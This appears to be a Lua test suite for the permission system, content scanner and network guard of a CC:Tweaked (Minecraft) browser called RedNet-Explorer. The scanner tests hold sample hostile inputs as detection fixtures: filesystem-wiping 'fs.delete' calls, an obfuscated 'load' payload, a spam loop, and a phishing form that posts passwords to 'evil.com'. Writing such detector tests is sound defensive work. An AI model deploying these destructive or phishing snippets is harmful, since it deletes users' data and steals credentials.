-- Test Suite for RedNet-Explorer Security Features
-- Tests permission system, content scanner, and network guard

local test = require("tests.test_framework")

-- Mock CC:Tweaked APIs
_G.os = {
    epoch = function(type) return 1705320000000 end,
    pullEvent = function() return "test_event" end,
    queueEvent = function() end,
    startTimer = function() return 1 end,
    cancelTimer = function() end
}

_G.fs = {
    exists = function(path) return false end,
    open = function(path, mode)
        return {
            write = function(self, data) end,
            writeLine = function(self, line) end,
            readAll = function(self) return "" end,
            close = function(self) end
        }
    end,
    makeDir = function(path) end
}

_G.textutils = {
    serialize = function(t) return tostring(t) end,
    unserialize = function(s) return {} end,
    serializeJSON = function(t) return "{}" end,
    unserializeJSON = function(s) return {} end
}

_G.term = {
    clear = function() end,
    setCursorPos = function() end,
    setBackgroundColor = function() end,
    setTextColor = function() end,
    clearLine = function() end,
    write = function() end
}

_G.colors = {
    white = 1, blue = 2048, black = 32768,
    yellow = 16, lightGray = 256, red = 16384
}

_G.keys = {
    y = 21, n = 49, a = 30, d = 32
}

_G.rednet = {
    broadcast = function() end,
    send = function() end
}

_G.parallel = {
    waitForAny = function(...)
        local funcs = {...}
        if #funcs > 0 then funcs[1]() end
    end
}

_G.sleep = function() end

-- Test Permission System
test.group("Permission System", function()
    local permissions = require("src.security.permission_system")
    
    test.case("Initialize permission system", function()
        permissions.init()
        test.assert(true, "Should initialize without error")
    end)
    
    test.case("Check default permissions", function()
        local granted = permissions.check(permissions.TYPES.NAVIGATION, "test.com")
        test.assert(granted, "Navigation should be allowed by default")
        
        granted = permissions.check(permissions.TYPES.PERIPHERAL, "test.com")
        test.assert(not granted, "Peripheral access should be denied by default")
    end)
    
    test.case("Grant and check permissions", function()
        permissions.grant(permissions.TYPES.DOWNLOAD, "example.com", permissions.SCOPES.DOMAIN)
        
        local granted = permissions.check(permissions.TYPES.DOWNLOAD, "example.com")
        test.assert(granted, "Download permission should be granted")
        
        granted = permissions.check(permissions.TYPES.DOWNLOAD, "other.com")
        test.assert(not granted, "Permission should be domain-specific")
    end)
    
    test.case("Deny permissions", function()
        permissions.deny(permissions.TYPES.AUDIO, "blocked.com", permissions.SCOPES.DOMAIN)
        
        local granted = permissions.check(permissions.TYPES.AUDIO, "blocked.com")
        test.assert(not granted, "Audio permission should be denied")
    end)
    
    test.case("Session permissions", function()
        permissions.grant(permissions.TYPES.CLIPBOARD, "temp.com", permissions.SCOPES.SESSION)
        
        local granted = permissions.check(permissions.TYPES.CLIPBOARD, "temp.com")
        test.assert(granted, "Session permission should be granted")
        
        permissions.clearSession()
        granted = permissions.check(permissions.TYPES.CLIPBOARD, "temp.com")
        test.assert(not granted, "Session permission should be cleared")
    end)
    
    test.case("One-time tokens", function()
        local token = permissions.createToken(permissions.TYPES.UPLOAD, "secure.com")
        test.assert(token ~= nil, "Should create token")
        
        local granted = permissions.check(permissions.TYPES.UPLOAD, "secure.com", {token = token})
        test.assert(granted, "Token should grant permission")
        
        -- Token should be consumed
        granted = permissions.check(permissions.TYPES.UPLOAD, "secure.com", {token = token})
        test.assert(not granted, "Token should be single-use")
    end)
    
    test.case("Permission validation", function()
        test.assert(permissions.isValidType(permissions.TYPES.COOKIES), "Should validate real permission")
        test.assert(not permissions.isValidType("fake_permission"), "Should reject fake permission")
    end)
    
    test.case("Domain permissions", function()
        permissions.grant(permissions.TYPES.LOCAL_STORAGE, "site.com", permissions.SCOPES.DOMAIN)
        permissions.grant(permissions.TYPES.COOKIES, "site.com", permissions.SCOPES.DOMAIN)
        
        local perms = permissions.getDomainPermissions("site.com")
        test.assert(perms[permissions.TYPES.LOCAL_STORAGE] == permissions.STATES.GRANTED, "Should have storage permission")
        test.assert(perms[permissions.TYPES.COOKIES] == permissions.STATES.GRANTED, "Should have cookie permission")
        
        permissions.resetDomain("site.com")
        perms = permissions.getDomainPermissions("site.com")
        test.assert(perms[permissions.TYPES.LOCAL_STORAGE] ~= permissions.STATES.GRANTED, "Permissions should be reset")
    end)
end)

-- Test Content Scanner
test.group("Content Scanner", function()
    local scanner = require("src.security.content_scanner")
    
    test.case("Initialize scanner", function()
        scanner.init()
        test.assert(true, "Should initialize without error")
    end)
    
    test.case("Scan safe content", function()
        local content = "Hello, this is safe content!"
        local result = scanner.scan(content, "text/plain")
        
        test.assert(result.safe, "Safe content should pass")
        test.equals(result.level, scanner.LEVELS.SAFE, "Should be marked safe")
    end)
    
    test.case("Detect malicious patterns", function()
        local maliciousCode = "fs.delete('.startup')"  
        local result = scanner.scan(maliciousCode, "text/plain")
        
        test.assert(not result.safe, "Malicious code should be detected")
        test.assert(result.level ~= scanner.LEVELS.SAFE, "Should not be marked safe")
        test.assert(#result.threats > 0, "Should have threat details")
    end)
    
    test.case("Detect code execution attempts", function()
        local exploit = "load(string.char(100,101,108))"  -- Obfuscated 'del'
        local result = scanner.scan(exploit, "text/plain")
        
        test.assert(not result.safe, "Exploit should be detected")
        test.equals(result.threats[1].category, scanner.CATEGORIES.EXPLOIT, "Should be categorized as exploit")
    end)
    
    test.case("Detect phishing patterns", function()
        local phishing = '<form action="http://evil.com"><input type="password" name="pass"></form>'
        local result = scanner.scan(phishing, "text/html")
        
        test.assert(not result.safe, "Phishing should be detected")
        local hasPhishing = false
        for _, threat in ipairs(result.threats) do
            if threat.category == scanner.CATEGORIES.PHISHING then
                hasPhishing = true
                break
            end
        end
        test.assert(hasPhishing, "Should detect phishing category")
    end)
    
    test.case("Trusted domains bypass", function()
        local content = "fs.delete('test')"  -- Would normally be malicious
        local result = scanner.scan(content, "text/plain", "rdnt://settings")
        
        test.assert(result.safe, "Trusted domains should bypass scanning")
    end)
    
    test.case("Pattern management", function()
        local customPattern = {
            pattern = "evil%.function",
            category = scanner.CATEGORIES.MALWARE,
            level = scanner.LEVELS.HIGH,
            description = "Custom evil pattern"
        }
        
        test.assert(scanner.addPattern(customPattern), "Should add custom pattern")
        
        local content = "evil.function()"
        local result = scanner.scan(content, "text/plain")
        test.assert(not result.safe, "Custom pattern should be detected")
        
        test.assert(scanner.removePattern("evil%.function"), "Should remove pattern")
    end)
    
    test.case("Scanner statistics", function()
        scanner.resetStatistics()
        
        scanner.scan("safe content", "text/plain")
        scanner.scan("fs.delete('/')", "text/plain")
        
        local stats = scanner.getStatistics()
        test.assert(stats.totalScanned >= 2, "Should track scanned count")
        test.assert(stats.threatsDetected >= 1, "Should track threats")
    end)
end)

-- Test Network Guard
test.group("Network Guard", function()
    local networkGuard = require("src.security.network_guard")
    
    test.case("Initialize network guard", function()
        networkGuard.init()
        test.assert(true, "Should initialize without error")
    end)
    
    test.case("Allow normal requests", function()
        local request = {
            senderId = 123,
            type = "http_request",
            size = 100
        }
        
        local action = networkGuard.checkRequest(request)
        test.equals(action, networkGuard.ACTIONS.ALLOW, "Normal request should be allowed")
    end)
    
    test.case("Rate limiting", function()
        networkGuard.reset()
        networkGuard.init({requestsPerMinute = 5})
        
        local request = {
            senderId = 456,
            type = "test",
            size = 10
        }
        
        -- Send requests up to limit
        for i = 1, 5 do
            local action = networkGuard.checkRequest(request)
            test.equals(action, networkGuard.ACTIONS.ALLOW, "Request " .. i .. " should be allowed")
        end
        
        -- Exceed limit
        for i = 6, 10 do
            local action = networkGuard.checkRequest(request)
            test.assert(action ~= networkGuard.ACTIONS.ALLOW, "Request " .. i .. " should be rate limited")
        end
    end)
    
    test.case("Bandwidth limiting", function()
        networkGuard.reset()
        networkGuard.init({maxBandwidthPerHost = 1000})
        
        local largeRequest = {
            senderId = 789,
            type = "download",
            size = 1500
        }
        
        local action = networkGuard.checkRequest(largeRequest)
        test.assert(action == networkGuard.ACTIONS.THROTTLE, "Large request should be throttled")
    end)
    
    test.case("Blacklisting", function()
        networkGuard.blacklist(999, 60000)  -- 1 minute
        
        local request = {
            senderId = 999,
            type = "test",
            size = 10
        }
        
        local action = networkGuard.checkRequest(request)
        test.equals(action, networkGuard.ACTIONS.BLOCK, "Blacklisted host should be blocked")
    end)
    
    test.case("Whitelisting", function()
        networkGuard.whitelist(111)
        networkGuard.blacklist(111)  -- Try to blacklist
        
        local request = {
            senderId = 111,
            type = "test",
            size = 10000  -- Large request
        }
        
        local action = networkGuard.checkRequest(request)
        test.equals(action, networkGuard.ACTIONS.ALLOW, "Whitelisted host should bypass checks")
    end)
    
    test.case("DDoS detection", function()
        networkGuard.reset()
        networkGuard.init({ddosThreshold = 10})
        
        local request = {
            senderId = 222,
            type = "flood",
            size = 1
        }
        
        -- Flood requests
        for i = 1, 15 do
            networkGuard.checkRequest(request)
        end
        
        local action = networkGuard.checkRequest(request)
        test.equals(action, networkGuard.ACTIONS.BLOCK, "DDoS should be detected")
    end)
    
    test.case("Malformed request handling", function()
        local badRequest = "not a table"
        local action = networkGuard.checkRequest(badRequest)
        test.equals(action, networkGuard.ACTIONS.DROP, "Malformed request should be dropped")
        
        local incompleteRequest = {type = "test"}  -- Missing senderId
        action = networkGuard.checkRequest(incompleteRequest)
        test.equals(action, networkGuard.ACTIONS.DROP, "Incomplete request should be dropped")
    end)
    
    test.case("Guard statistics", function()
        networkGuard.reset()
        
        -- Generate some activity
        for i = 1, 10 do
            networkGuard.checkRequest({
                senderId = i,
                type = "test",
                size = 100
            })
        end
        
        networkGuard.blacklist(999)
        
        local stats = networkGuard.getStatistics()
        test.assert(stats.totalRequests >= 10, "Should track total requests")
        test.assert(stats.blacklistedHosts >= 1, "Should track blacklisted hosts")
        test.assert(stats.activeHosts > 0, "Should track active hosts")
    end)
end)

-- Integration Tests
test.group("Security Integration", function()
    test.case("Permission + Scanner integration", function()
        local permissions = require("src.security.permission_system")
        local scanner = require("src.security.content_scanner")
        
        -- Site requests script permission
        local domain = "untrusted.com"
        
        -- Check if scripts allowed
        local canExecute = permissions.check(permissions.TYPES.EXECUTE_SCRIPTS, domain)
        
        if not canExecute then
            -- Scan the script before prompting
            local script = "print('Hello world')"
            local scanResult = scanner.scan(script, "text/plain", domain)
            
            if scanResult.safe then
                -- Safe script, could prompt user
                test.assert(true, "Safe script could be allowed")
            else
                -- Malicious script, auto-deny
                permissions.deny(permissions.TYPES.EXECUTE_SCRIPTS, domain, permissions.SCOPES.DOMAIN)
                test.assert(true, "Malicious script auto-denied")
            end
        end
    end)
    
    test.case("Scanner + Network Guard integration", function()
        local scanner = require("src.security.content_scanner")
        local networkGuard = require("src.security.network_guard")
        
        -- Detect malicious content and block host
        local maliciousContent = "while true do rednet.broadcast('spam') end"
        local scanResult = scanner.scan(maliciousContent, "text/plain")
        
        if not scanResult.safe and scanResult.level == scanner.LEVELS.CRITICAL then
            -- Auto-blacklist the source
            networkGuard.blacklist(333, -1)  -- Permanent ban
            
            local request = {senderId = 333, type = "test", size = 1}
            local action = networkGuard.checkRequest(request)
            
            test.equals(action, networkGuard.ACTIONS.BLOCK, "Malicious host should be blocked")
        end
    end)
    
    test.case("Full security pipeline", function()
        local permissions = require("src.security.permission_system")
        local scanner = require("src.security.content_scanner")
        local networkGuard = require("src.security.network_guard")
        
        -- Simulate incoming request
        local request = {
            senderId = 444,
            type = "page_request",
            size = 1024,
            domain = "suspicious.com",
            content = '<script>fs.delete("/")</script>'
        }
        
        -- Step 1: Check network abuse
        local networkAction = networkGuard.checkRequest(request)
        test.equals(networkAction, networkGuard.ACTIONS.ALLOW, "First request should pass network check")
        
        -- Step 2: Scan content
        local scanResult = scanner.scan(request.content, "text/html", request.domain)
        test.assert(not scanResult.safe, "Malicious content should be detected")
        
        -- Step 3: Update permissions based on threat
        if scanResult.level == scanner.LEVELS.CRITICAL then
            permissions.deny(permissions.TYPES.EXECUTE_SCRIPTS, request.domain, permissions.SCOPES.DOMAIN)
            networkGuard.blacklist(request.senderId, 3600000)  -- 1 hour ban
        end
        
        -- Step 4: Verify protections are in place
        local canExecute = permissions.check(permissions.TYPES.EXECUTE_SCRIPTS, request.domain)
        test.assert(not canExecute, "Scripts should be blocked for malicious domain")
        
        networkAction = networkGuard.checkRequest(request)
        test.equals(networkAction, networkGuard.ACTIONS.BLOCK, "Malicious host should be blocked")
    end)
end)

-- Run all tests
test.runAll()